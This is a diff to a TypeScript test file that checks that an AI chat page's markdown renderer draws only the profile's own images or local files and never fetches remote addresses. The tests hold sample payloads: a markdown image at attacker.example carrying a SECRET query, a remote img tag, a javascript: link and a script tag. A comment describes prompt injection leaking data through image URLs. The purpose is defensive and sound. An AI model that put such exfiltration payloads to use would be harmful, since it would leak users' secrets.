@@ -11,7 +11,7 @@ import { csv } from '../src/ui/table.ts';
 
 const html = (markdown: string) => renderToStaticMarkup(createElement(ReactMarkdown, { remarkPlugins: [remarkGfm], components: safe }, markdown));
 
-test('a reply cannot make the page fetch anything: only the profile\'s own images are drawn, and a link waits for a click', () => {
+test('a reply cannot make the page fetch anything: only the profile\'s own images and pictures on this machine are drawn, and a link waits for a click', () => {
   // An image elsewhere would send its address, and whatever a prompt injection put in it, the moment the reply is shown.
   const remote = html('![chart](https://attacker.example/p.png?d=SECRET)');
   assert.doesNotMatch(remote, /<img|<link|preload/);
@@ -19,6 +19,12 @@ test('a reply cannot make the page fetch anything: only the profile\'s own image
   for (const address of ['//attacker.example/p.png', '/images/work/../../elsewhere', 'http://127.0.0.1:4780/images/work/0123456789abcdef', 'data:image/png;base64,AAAA'])
     assert.doesNotMatch(html(`![x](${address})`), /<img/, address);
   assert.match(html('![shot](/images/work/0123456789abcdef)'), /<p><img src="\/images\/work\/0123456789abcdef" alt="shot"\/><\/p>$/);
+  // A picture on this machine by its absolute path, which the page asks this server for; not a relative one, nor another kind.
+  assert.match(html('![chart](</tmp/a chart.png>)'), /<img src="\/file\?path=%2Ftmp%2Fa\+chart\.png&amp;token=" alt="chart"\/>/);
+  // An escaped # is part of the file's name.
+  assert.match(html('![chart](/tmp/chart%231.png)'), /path=%2Ftmp%2Fchart%231\.png&amp;/);
+  for (const address of ['tmp/chart.png', '/tmp/notes.svg', '/tmp/chart.png?x=1', '/tmp/a?b.png', 'file:///tmp/chart.png'])
+    assert.doesNotMatch(html(`![x](${address})`), /<img/, address);
 
   assert.equal(html('[docs](https://example.com/a)'), '<p><a href="https://example.com/a" target="_blank" rel="noreferrer noopener">docs</a></p>');
   assert.doesNotMatch(html('[run](javascript:alert(1)) and <img src="https://attacker.example/x.png"> and <script>alert(1)</script>'), /javascript:|<img|<script/);
